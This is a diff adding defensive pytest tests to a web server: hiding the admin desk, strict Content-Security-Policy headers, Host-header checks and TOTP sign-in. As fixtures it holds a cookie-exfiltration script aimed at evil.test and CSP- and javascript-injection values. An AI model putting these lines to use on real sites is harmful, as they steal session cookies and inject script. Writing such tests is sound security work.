@@ -3,6 +3,7 @@ import json
 import socket
 import socketserver
 import threading
+import time
 from datetime import datetime, timezone
 from functools import partial
 from http.server import ThreadingHTTPServer
@@ -544,3 +545,115 @@ def test_a_burst_of_readers_is_queued_not_refused(env):
         codes = list(pool.map(get, range(300)))
     srv.shutdown()
     assert codes.count(200) == 300
+
+
+# ---------- the public address has no desk; the desk is private, code-protected and answers only to its own names ----------
+@pytest.fixture
+def public(env, web):
+    srv = server.Server(("127.0.0.1", 0), partial(server.PublicHandler, directory=str(env.tmp / "public")))
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    port = srv.server_address[1]
+
+    def call(method, path, body=None, headers=None):
+        c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
+        c.request(method, path, body, {"Content-Type": "application/x-www-form-urlencoded", "Origin": f"http://127.0.0.1:{port}", **(headers or {})})
+        r = c.getresponse()
+        data = r.read().decode(errors="replace")
+        c.close()
+        return SimpleNamespace(status=r.status, text=data, headers=r.headers)
+    yield SimpleNamespace(call=call, port=port)
+    srv.shutdown()
+
+
+def test_the_public_address_has_no_desk_at_all(public):
+    for path in ("/admin", "/admin/", "/admin/login", "/admin/ads", "/admin/settings", "/admin/log?job=1"):
+        r = public.call("GET", path)
+        assert r.status == 404 and "password" not in r.text.lower(), path
+    for path in ("/admin/login", "/admin/publish", "/admin/settings", "/admin/api/decide"):
+        assert public.call("POST", path, "password=correct+horse").status == 404, path
+    assert public.call("HEAD", "/admin").status == 405
+
+
+def test_public_health_check_says_nothing_more_than_up(public):
+    r = public.call("GET", "/healthz")
+    assert json.loads(r.text) == {"ok": True}
+
+
+def test_no_software_names_in_answers(public, web):
+    for r in (public.call("GET", "/"), web.call("GET", "/admin/login")):
+        assert r.headers["Server"] == "Bought", r.headers["Server"]
+
+
+def test_the_page_gets_a_strict_content_security_policy(public, env):
+    csp = public.call("GET", "/").headers["Content-Security-Policy"]
+    assert "script-src 'self' 'wasm-unsafe-eval' https://checkout.razorpay.com;" in csp
+    assert "object-src 'none'" in csp and "frame-ancestors 'self'" in csp and "'unsafe-eval'" not in csp.replace("wasm-unsafe-eval", "")
+    assert "upgrade-insecure-requests" not in csp
+    assert "upgrade-insecure-requests" in public.call("GET", "/", headers={"X-Forwarded-Proto": "https"}).headers["Content-Security-Policy"]
+
+
+def test_share_pages_may_run_only_their_own_redirect(public, env):
+    from pipeline import security as sec
+    share = env.tmp / "public" / "s" / "abc"
+    share.mkdir(parents=True)
+    good, evil = 'location.replace("../../#s-2026-11-05-abc");', "fetch('https://evil.test/'+document.cookie)"
+    (share / "index.html").write_text(f"<!doctype html><title>t</title><script>{good}</script><script>{evil}</script>")
+    csp = public.call("GET", "/s/abc/").headers["Content-Security-Policy"]
+    assert sec.script_hash(good) in csp and sec.script_hash(evil) not in csp
+
+
+def test_the_site_policy_names_only_a_real_supabase_address():
+    from pipeline import security as sec
+    assert "https://abc.supabase.co" in sec.site_csp("https://abc.supabase.co", True) and "wss://abc.supabase.co" in sec.site_csp("https://abc.supabase.co", True)
+    for bad in ("https://x.co; script-src *", "http://plain.test", "javascript:alert(1)", None):
+        csp = sec.site_csp(bad, True)
+        assert "script-src *" not in csp and "plain.test" not in csp and "javascript" not in csp
+
+
+def test_the_desk_refuses_other_host_names(web):
+    c = http.client.HTTPConnection("127.0.0.1", web.port, timeout=10)
+    c.request("GET", "/admin/login", headers={"Host": "attacker.example"})
+    r = c.getresponse()
+    assert r.status == 421 and b"Password" not in r.read()
+    c.close()
+    c = http.client.HTTPConnection("127.0.0.1", web.port, timeout=10)
+    c.request("POST", "/admin/login", "password=correct+horse", {"Host": f"rebind.example:{web.port}", "Origin": f"http://rebind.example:{web.port}", "Content-Type": "application/x-www-form-urlencoded"})
+    assert c.getresponse().status == 421
+    c.close()
+
+
+def test_desk_host_names_from_settings():
+    from pipeline import security as sec
+    hosts = sec.desk_hosts(8100, "bought-vps.tail1234.ts.net, desk.internal:443")
+    assert {"localhost:8100", "127.0.0.1:8100", "bought-vps.tail1234.ts.net", "bought-vps.tail1234.ts.net:8100", "desk.internal:443"} <= hosts
+    assert "desk.internal" not in hosts and "evil.test:8100" not in hosts
+
+
+def test_desk_sign_in_needs_password_and_a_fresh_code(web):
+    from pipeline import security as sec
+    secret = sec.new_totp_secret()
+    web.app.codes = sec.CodeCheck(secret)
+    assert 'name="code"' in web.call("GET", "/admin/login").text
+    now_code = sec.totp(secret, int(time.time() // 30))
+    assert web.call("POST", "/admin/login", "password=correct+horse").status == 401                     # no code
+    assert web.call("POST", "/admin/login", "password=correct+horse&code=000000" if now_code != "000000" else "password=correct+horse&code=111111").status == 401
+    assert web.call("POST", "/admin/login", f"password=wrong&code={now_code}").status == 401             # right code, wrong password
+    web.app.codes = sec.CodeCheck(secret)                                                                # (the try above used the code up)
+    r = web.call("POST", "/admin/login", f"password=correct+horse&code={now_code}")
+    assert r.status == 303 and "bought_admin=" in r.headers["Set-Cookie"]
+    assert web.call("POST", "/admin/login", f"password=correct+horse&code={now_code}").status == 401     # the same code can't be used twice
+
+
+def test_desk_sign_in_from_another_site_is_refused(web):
+    r = web.call("POST", "/admin/login", "password=correct+horse", origin=False)
+    assert r.status == 403
+
+
+def test_codes_match_the_published_test_vectors():
+    from pipeline import security as sec
+    secret = "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ"            # RFC 6238 appendix B, SHA-1
+    for t, expected in ((59, "287082"), (1111111109, "081804"), (1234567890, "005924"), (2000000000, "279037")):
+        assert sec.totp(secret, t // 30) == expected
+    check = sec.CodeCheck(secret)
+    assert check.verify("287 082", now=59) and not check.verify("287082", now=59)
+    assert not sec.CodeCheck(secret).verify("287082", now=59 + 120)      # four minutes late
